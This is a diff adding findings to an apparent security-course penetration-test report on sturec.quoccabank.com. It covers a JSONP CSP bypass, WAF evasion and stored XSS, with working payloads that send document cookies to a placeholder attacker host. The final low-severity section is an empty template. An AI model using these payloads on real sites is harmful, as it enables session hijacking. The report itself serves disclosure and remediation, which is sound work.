@@ -104,7 +104,49 @@ Prohibiting the upload of svg files prevents similar attacks from happening. How
 
 
 
-### CRITICAL - sturec
+### HIGH - WAF and JSONP XSS in sturec.quoccabank.com
+
+**Asset Domain:** sturec.quoccabank.com
+
+**Severity Classification:** HIGH
+
+#### Vulnerability Details
+
+Using JSON-P (JSON with Padding) to render the page is insecure since an attacker can replace the arbitrary callback function, and use it to bypass the Content Security Policy (CSP) set by the website to only allow same origin scripts, resulting in cross-site scripting (XSS). Furthermore, a weak web application firewall (WAF) is used to try to prevent malicious scripts for cookie stealing. 
+
+#### Proof of Concept / Steps to Reproduce
+
+![sturec1](images/sturec1.png)
+
+Injecting HTML into the search form for last name, it can be seen that HTML input gets reflected on the query page. For example, typing in `<b>test</b>` as the last name displays the bolded test, as can be seen in the image above. However, injecting something like `<script>alert(1)</script>` does not seem to work since the Content Security Policy (CSP) blocks external scripts, as evident from the console shown below. 
+
+![sturec2](images/sturec2.png)
+
+Furthermore, analysing the network requests when loading the page indicates that a request is made to sturec.quoccabank.com/students.jsonp?q={QUERY}&callback=render, which returns the data to be displayed (based on query) wrapped within a render function call. This means we can use the jsonp route to load a script that we want run, which won't be blocked since it comes from the same origin, adjusting the callback argument. As a proof of concept, entering the following payload into the search bar successfully yields an alert on the page:
+
+```html
+<script src=/students.jsonp?callback=alert(1);render />
+```
+
+![sturec3](images/sturec3.png)
+
+This can be further extended to steal a user's cookies. From experimenting, it seems that the `+` and `.` characters are blocked by the WAF to prevent usual cookie stealing XSS attacks. However, malicious payloads can still be crafted to bypass such restrictions. Referring to `document['cookie']` instead of `document.cookie` bypasses the period character restriction. The `+` character restriction can be bypassed by sending a POST request to an attacker site with the cookie, or using string literals as shown below:
+
+```html
+<script src=/students.jsonp?callback=fetch(`${ATTACKER.COM/}${document['cookie']}`);render />
+```
+
+#### Impact
+
+As demonstrated above, an attacker is able to use JSONP to bypass the website's CSP settings and successfully inject malicious scripts into the page. The XSS attack can be extended to steal user cookies from anyone who access a compromised page. 
+
+#### Remediation
+
+JSONP should not be used since it can be used to bypass CSP same origin restrictions. Furthermore, search results should be rendered as HTML-encoded text instead of HTML, especially since the search feature is designed to look up last names anyways. However, if this is not possible, the WAF should use a common trusted framework to sanitise malicious input, such as DOMPurify, since the current WAF can be easily bypassed, as demonstrated above. 
+
+
+
+### CRITICAL - Stored XSS in sturec.quoccabank.com
 
 **Asset Domain:** sturec.quoccabank.com
 
@@ -112,8 +154,59 @@ Prohibiting the upload of svg files prevents similar attacks from happening. How
 
 #### Vulnerability Details
 
+A malicious student can be created and added to the database such that whenever that student is rendered on any user's browser, there can be arbitrary client-side code execution through cross-site scripting (XSS). 
+
 #### Proof of Concept / Steps to Reproduce
+
+![sturec4](images/sturec4.png)
+
+Using Burp Suite to intercept a request for creating a new student, it can be seen that there is a hidden field added for "dcreate", referring to the date of creation (above). However, after successfully creating the student, it can be seen below that this field is hidden and not rendered on the screen, using a CSS display: none to hide its value. Using a payload such as `<b>test</b>` for dcreate, it can be seen that the beginning tag is removed by the WAF. 
+
+![sturec5](images/sturec5.png)
+
+From experimentation, it seems the WAF can be bypassed using something like `<<b>_b>test</b>` to keep the opening tag, where the opening tag as well as the following character seems to get stripped by the WAF. We can extend this proof of concept for arbitrary client-side code execution, using a similar technique from the previous sturec subdomain vulnerability regarding using JSONP to bypass the CSP blocking external scripts. The following payload creates a malicious new student such that everytime that student is rendered, arbitrary code is executed for anyone who can see the student's row, such as for cookie stealing.
+
+```html
+<<b>_script src=/students.jsonp?callback=fetch(`${ATTACKER.COM/}${document['cookie']}`);render />
+```
+
+![sturec3](images/sturec3.png)
+
+#### Impact
+
+As demonstrated above, it is possible to create a malicious student entry and add it to the database. This means that whenever that student is rendered on any user's browser, arbitrary code can be executed on their browser. This poses as a security concern, since user cookies can be stolen, resulting in hijacked sessions.
+
+#### Remediation
+
+As previously recommended, the web application should avoid using JSONP so the CSP cannot be bypassed for executing arbitrary JavaScript. Furthermore, the dcreate field should be HTML-encoded like the other fields (or even sanitised) even if it seems like a user cannot write to the field, since the CSS display: none only hides it visually so that the user does not see it, although the browser still interprets and executes the HTML. It may be better to manually set a dcreate on the server side, so users are unable to modify its client-side creation (using Burp Suite for example). 
+
+
+
+### LOW - Reflected XSS in sturec.quoccabank.com
+
+**Asset Domain:** sturec.quoccabank.com
+
+**Severity Classification:** LOW
+
+#### Vulnerability Details
+
+#### Proof of Concept / Steps to Reproduce
+
+
+
+![sturec6](images/sturec6.png)
+
+
 
 #### Impact
 
 #### Remediation
+
+
+
+
+
+
+
+
+
